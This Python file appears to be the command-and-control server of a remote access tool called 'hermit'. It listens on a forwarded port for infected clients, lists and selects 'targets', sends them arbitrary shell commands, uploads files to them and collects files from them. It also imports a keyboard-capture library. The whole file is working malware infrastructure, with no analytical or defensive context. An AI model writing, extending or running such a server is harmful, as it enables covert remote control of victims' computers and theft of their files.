import socket
import os
import time
import subprocess
import threading
from queue import Queue
import pynput

connections_allowed = 50
connections = []
addresses = []

THREADS = 2
JOB_NUMBER = [1, 2]
queue = Queue()


def socket_create():
    try:
        global host_list
        global port
        global s
        host_list = [""] # Insert private IP(s) in list to bind the socket for client conn
        port = 0 # Insert your port that has been forwarded and is open for others to connect to.
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    except:
        print("Error while creating socket")


def socket_bind():
    try:
        global host
        global port
        global s
        for host in host_list:
            try:
                s.bind((host, port))
            except:
                continue
        s.listen(connections_allowed)
    except:
        print("Error while binding sockets")


def accept_connections():
    for c in connections:
        c.close()
    del connections[:]
    del addresses[:]
    while 1:
        try:
            conn, address = s.accept()
            conn.setblocking(1)
            connections.append(conn)
            addresses.append(address)
            print(f"Connection established: {address[0]}")
        except:
            print("Error while accepting connections")


def start_hermit():
    global conn
    while True:
        prompt = input(":hermit% ")
        if prompt == "list clients":
            list_connections()
            continue
        elif prompt == "quit":
            exit()
        elif "select " in prompt:
            conn = get_target(prompt)
            if conn is not None:
                send_target_commands(conn)
        else:
            print("Command not recognised")


def list_connections():
    results = ""
    for i in range(len(connections)):
        conn = connections[i]
        try:
            conn.send(str.encode("  "))
            conn.recv(4096)
        except:
            del connections[i]
            del addresses[i]
            continue
        results += f"{str(i)}  {str(addresses[i][0])}  {str(addresses[i][1])}\n"
    print(f"----- Clients ------\n{results}")


def get_target(prompt):
    try:
        target = prompt.replace("select ", "")
        target = int(target)
        conn = connections[target]
        print(f"Connected to: {str(addresses[target][0])}")
        return conn
    except:
        print("Not a valid selection")
        return None


def send_target_commands(conn):
    while True:
        try:
            cmd = input(r"device>>> ")

            if cmd == "disconnect":
                break

            if len(cmd) > 0:
                conn.send(str.encode(cmd))
                data = conn.recv(40960).decode("utf-8")
                data = data.replace(r"\n", "\n")
                if data != " ":
                    print(data)

            #transfer file must be in same dir as server.py
            if "file transfer " in cmd:
                time.sleep(0.5)
                print("Transfering file to targets cwd")
                cmd = cmd.replace("file transfer ", "")
                file = open(cmd, "rb")
                file_data = file.read()
                conn.send(file_data)
                file.close()
                print("Transfer file sent.")

            elif "file collect " in cmd:
                while True:
                    f_path = input("Enter new file path: ")
                    if os.path.exists(os.path.expanduser(f_path)):
                            print("A file already exists here; choose another path.")
                            continue
                    cmd = f_path
                    try:
                        file = open(cmd, "wb")
                        print("Recieving Data")
                        file_data = conn.recv(81920000)
                        print("Writing File")
                        file.write(file_data)
                        print("Collection complete")
                        file.close()
                        break
                    except:
                        print("Directories to path do not exist.")
                        try:
                            file.close()
                        except:
                            pass
                        continue

            elif "rename " in cmd: # RENAME OPERATION IS FULLY OPERATED ON CLIENT SIDE
                print("renaming filepath")


        except BrokenPipeError:
            print(BrokenPipeError)
            continue
        except:
            continue
    print("Disconnected\n")


def create_workers():
    for _ in range(THREADS):
        t = threading.Thread(target=work)
        t.daemon = True
        t.start()


def work():
    while True:
        x = queue.get()
        if x == 1:
            socket_create()
            socket_bind()
            accept_connections()
        if x == 2:
            start_hermit()
        queue.task_done()



def create_jobs():
    for x in JOB_NUMBER:
        queue.put(x)
    queue.join()


create_workers()
create_jobs()
